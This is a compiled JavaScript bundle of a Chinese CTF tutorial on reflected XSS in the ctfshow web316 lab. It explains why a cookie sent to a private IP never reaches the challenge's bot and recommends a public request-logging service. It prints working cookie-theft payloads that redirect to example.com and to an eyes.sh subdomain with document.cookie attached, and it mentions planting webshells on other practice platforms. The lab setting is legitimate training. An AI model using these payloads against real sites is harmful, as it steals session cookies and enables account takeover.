(window.webpackJsonp=window.webpackJsonp||[]).push([[63],{420:function(s,t,a){"use strict";a.r(t);var e=a(8),r=Object(e.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("p",[s._v("下面以反射型xss举例，使用免费无需登录的weblog平台记录http请求，拿到xss窃取的cookie，好用推荐！")]),s._v(" "),t("p",[s._v("什么是XSS？攻击者准备了一个payload，在用户点击后，在用户浏览器里执行了攻击者提供的javascript代码，js代码可以获取到用户的cookie等信息。xss题目一般后台会有一个机器人脚本/功能，定期执行用户提交的payload。")]),s._v(" "),t("p",[s._v("例如，一个页面，会把url里的参数值显示在页面，例如"),t("code",[s._v("http://example.com/?name=<script>alert(1)<\/script>")]),s._v("，如果页面没有对参数值进行过滤，直接显示在页面上，那么就会执行"),t("code",[s._v("<script>alert(1)<\/script>")]),s._v("这段代码，弹出一个提示框。")]),s._v(" "),t("p",[s._v("什么是叉自己？")]),s._v(" "),t("h2",{attrs:{id:"叉自己举例-细节"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#叉自己举例-细节"}},[s._v("#")]),s._v(" 叉自己举例/细节")]),s._v(" "),t("p",[s._v("下面以web316具体举例。")]),s._v(" "),t("p",[s._v("打开靶机，看看自己的cookie，"),t("code",[s._v("flag=you are not admin no flag")]),s._v("，真实的flag是网站管理员的cookie，也就是后台的xss bot机器人的cookie")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/xss-weblog/1.png",alt:"1"}})]),s._v(" "),t("p",[s._v("随便输入111，提交，提交的内容111直接显示在了页面上。重点提交的111是一个get参数出现在url里，可以在页面直接显示，有xss漏洞的可能。")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/xss-weblog/2.png",alt:"2"}})]),s._v(" "),t("p",[s._v("提交一串js代码")]),s._v(" "),t("div",{staticClass:"language-javascript line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-javascript"}},[t("code",[t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("页面成功执行了js代码，弹出提示框1，说明有xss漏洞。")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/xss-weblog/3.png",alt:"3"}})]),s._v(" "),t("p",[s._v("可以使用js代码，在用户打开恶意构造的url时，执行js，发起一个网络请求，把用户的cookie发送到攻击者的服务器上。")]),s._v(" "),t("p",[t("strong",[s._v("窃取用户cookie有什么用？")]),s._v("，对于一些简单的站点，在访问站点时，带上该用户的cookie，有可能可以直接登录该用户的账号，获取用户的敏感信息。")]),s._v(" "),t("p",[s._v("例如下面这段代码，获取当前页面网站的cookie，把网站重定向请求攻击者的服务器上，把这里的"),t("code",[s._v("http://example.com")]),s._v("换成自己服务器的ip就可以收到这个xss请求的cookie。")]),s._v(" "),t("div",{staticClass:"language-javascript line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-javascript"}},[t("code",[t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\nwindow"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("location"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("href "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'http://example.com/?cookie='")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" document"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("cookie\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[s._v("新手师傅自然而然想到查看自己电脑的ip，把上面换成自己的ip，PHPstudy或者python开个web服务，发现flag是"),t("code",[s._v("you are not admin no flag")]),s._v("，没有拿到flag。")]),s._v(" "),t("p",[s._v("例如我使用python开一个python http服务，我的ip是"),t("code",[s._v("192.168.6.116")]),s._v("，端口4444")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/xss-weblog/4.png",alt:"4"}})]),s._v(" "),t("p",[t("strong",[s._v("你拿到的这个cookie是谁的？你自己的。你写了一个恶意xss payload在攻击自己，叉自己。在你提交这个恶意payload时，靶机后台xss bot在执行这个js代码时，在他内网没有这个主机，找不到他内网的192.168.6.116这个ip，访问不到你的192，172，10段ip")])]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/xss-weblog/5.png",alt:"5"}})]),s._v(" "),t("h2",{attrs:{id:"解决方案"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#解决方案"}},[s._v("#")]),s._v(" 解决方案")]),s._v(" "),t("p",[s._v("那就有好奇宝宝要问了，对啊对啊，我是内网ip，靶机访问不到我，我该怎么做这题？好问题，提供几个简单的方法")]),s._v(" "),t("ul",[t("li",[s._v("使用网络上免费提供的"),t("code",[s._v("weblog")]),s._v("平台，把xss的请求url叉到这里。（简单推荐，0成本，即开即用）")]),s._v(" "),t("li",[s._v("使用自己的公网服务器python开启一个http服务。注意不要直接在"),t("code",[s._v("~")]),s._v("目录开启，会泄露"),t("code",[s._v("~")]),s._v("目录的所有文件，网络上会有恶意攻击者专门扫描这个特征指纹。")]),s._v(" "),t("li",[s._v("如果你在做ctfshow的xss，同时你还有攻防世界、buuctf、nssctf靶场的账号，在其他靶场找个简单的web题目，拿个webshell，写个php文件，把url请求的参数值写进文件。")]),s._v(" "),t("li",[s._v("使用内网穿透攻击，把本地内网ip、端口映射到公网。")])]),s._v(" "),t("p",[s._v("这里只介绍第一种方法，其他方法自行探索。")]),s._v(" "),t("p",[t("code",[s._v("weblog")]),s._v("推荐平台 "),t("a",{attrs:{href:"https://eyes.sh/dns/",target:"_blank",rel:"noopener noreferrer"}},[s._v("eyes.sh"),t("OutboundLink")],1)]),s._v(" "),t("p",[s._v("打开，直接使用平台分配的账号进去，不需要自己注册。")]),s._v(" "),t("p",[s._v("在"),t("code",[s._v("dnslog")]),s._v("页面，记录分配给你的子域名")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/xss-weblog/6.png",alt:"6"}})]),s._v(" "),t("p",[s._v("修改xss payload，把受害者（xss bot）的cookie叉到这里，不出意外的话，会收到两个请求，一个是你提交payload时触发的请求，另一个是靶机后台xss bot执行payload时触发的请求。")]),s._v(" "),t("div",{staticClass:"language-javascript line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-javascript"}},[t("code",[t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\nwindow"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("location"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("href "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'http://enwvbm6o.eyes.sh/?cookie='")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" document"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("cookie\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[s._v("验证成功")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/xss-weblog/7.png",alt:"7"}})])])}),[],!1,null,null,null);t.default=r.exports}}]);